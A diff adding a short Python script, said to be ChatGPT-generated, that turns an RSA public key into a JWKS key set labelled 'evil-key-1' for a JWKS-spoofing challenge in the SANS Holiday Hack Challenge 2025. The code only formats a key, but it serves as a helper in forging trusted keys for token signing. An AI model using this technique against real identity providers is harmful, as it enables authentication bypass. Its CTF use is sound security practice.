@@ -1,0 +1,30 @@
+# script generate by ChatGPT
+# script used on Rogue Gnome Identity Provider - JWKS spoofing - SANS Holiday Hack Challenge 2025
+# Video walk through: https://youtu.be/AWEcumWFnHs
+
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+import base64, json
+
+def b64url(b):
+    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+with open("public.pem", "rb") as f:
+    pub = serialization.load_pem_public_key(f.read(), backend=default_backend())
+
+numbers = pub.public_numbers()
+e = numbers.e
+n = numbers.n
+
+jwks = {
+    "keys": [
+        {
+            "kty": "RSA",
+            "kid": "evil-key-1",
+            "n": b64url(n.to_bytes((n.bit_length() + 7) // 8, "big")),
+            "e": b64url(e.to_bytes((e.bit_length() + 7) // 8, "big")),
+        }
+    ]
+}
+
+print(json.dumps(jwks))
